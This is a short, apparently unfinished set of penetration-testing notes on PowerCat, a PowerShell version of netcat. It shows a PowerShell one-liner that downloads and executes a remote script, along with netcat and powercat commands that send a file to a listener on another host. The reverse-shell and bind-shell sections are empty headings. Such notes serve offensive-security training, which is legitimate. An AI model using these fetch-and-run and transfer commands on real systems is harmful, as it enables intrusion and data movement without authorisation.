# PowerCat

Powercat is best described as a PowerShell version of netcat, with much of the same functionality.

PowerCat is installed in Kali with:  

```text
apt install powercat
```

On Windows clients we start by "dot-sourcing" to load powercat.ps1.  This makes all variables and functions of powercat available in powershell.

```text
..\powercat.ps1
```

If the target is connected to the Internet, we can also do the same with a remote script:

```text
iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```

You can also use powercat to transfer powercat

Run a listener on receiving machine: 

```text
sudo nc -nlvp 443 > receiving_powercat.ps1
```

Send using the following command:

```text
powercat -ca 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
```

#### Powercat Reverse Shells

```

#### Powercat bind shells
